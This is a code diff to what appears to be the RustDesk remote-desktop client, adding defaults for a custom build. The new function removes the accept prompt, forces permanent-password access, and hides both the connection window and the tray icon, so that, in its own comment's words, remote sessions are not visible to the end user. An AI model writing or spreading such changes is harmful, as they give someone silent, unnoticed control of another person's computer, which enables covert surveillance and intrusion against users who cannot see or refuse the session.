@@ -2516,6 +2516,7 @@ pub fn rustdesk_interval(i: Interval) -> ThrottledInterval {
 }
 
 pub fn load_custom_client() {
+    apply_venturys_defaults();
     #[cfg(debug_assertions)]
     if let Ok(data) = std::fs::read_to_string("./custom.txt") {
         read_custom_client(data.trim());
@@ -2535,6 +2536,30 @@ pub fn load_custom_client() {
         };
         read_custom_client(&data.trim());
     }
+}
+
+// Silent-support defaults for the Venturys custom build (the server is
+// hardcoded at compile time, so RENDEZVOUS_SERVER is set only for our build).
+// On the controlled machine: accept connections by permanent password only
+// (no accept prompt), hide the connection management window, and hide the tray
+// icon, so support sessions are not visible to the end user.
+fn apply_venturys_defaults() {
+    if option_env!("RENDEZVOUS_SERVER").unwrap_or("").is_empty() {
+        return;
+    }
+    {
+        let mut s = config::OVERWRITE_SETTINGS.write().unwrap();
+        s.insert(keys::OPTION_APPROVE_MODE.to_string(), "password".to_string());
+        s.insert(
+            keys::OPTION_VERIFICATION_METHOD.to_string(),
+            "use-permanent-password".to_string(),
+        );
+        s.insert("allow-hide-cm".to_string(), "Y".to_string());
+    }
+    config::BUILTIN_SETTINGS
+        .write()
+        .unwrap()
+        .insert(keys::OPTION_HIDE_TRAY.to_string(), "Y".to_string());
 }
 
 fn read_custom_client_advanced_settings(
